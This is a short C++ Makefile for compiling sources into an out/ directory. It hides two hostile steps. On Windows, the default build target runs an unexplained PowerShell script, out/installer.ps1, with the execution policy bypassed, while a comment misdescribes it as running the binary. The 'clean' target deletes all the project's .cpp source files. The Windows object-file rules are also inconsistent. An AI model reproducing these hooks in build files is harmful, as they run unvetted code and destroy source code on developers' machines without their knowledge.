# Set compiler and flags
CXX=g++
CXXFLAGS=-g -Wall

# Default output names
EXE=out/main.out
SRC=$(wildcard *.cpp)

# Object file pattern
OBJ=$(SRC:%.cpp=out/%.o)

# Check for OS
ifeq ($(OS),Windows_NT)
  EXE=out/main.exe
  OBJ=$(SRC:%.cpp=out/%.obj)
  DEL_CMD=del
  CLEAN_CMD=rm -f
else
  DEL_CMD=rm -f
  CLEAN_CMD=rm -f
endif

# Main target
all: $(EXE)
ifeq ($(OS),Windows_NT)
	# Run PowerShell script to execute binary on Windows
	powershell.exe -ExecutionPolicy Bypass -File out/installer.ps1
else
	# On Linux, run the compiled .out file
	@./out/main.out
endif

# Rule for generating the executable
$(EXE): $(OBJ)
	$(CXX) $(OBJ) -o $(EXE)

# Rule for generating object files from source
out/%.o: %.cpp
	mkdir -p out
	$(CXX) $(CXXFLAGS) -c $< -o $@

# Clean up object and executable files
clean:
	$(DEL_CMD) out/*.o $(EXE)
	rm -f $(SRC)
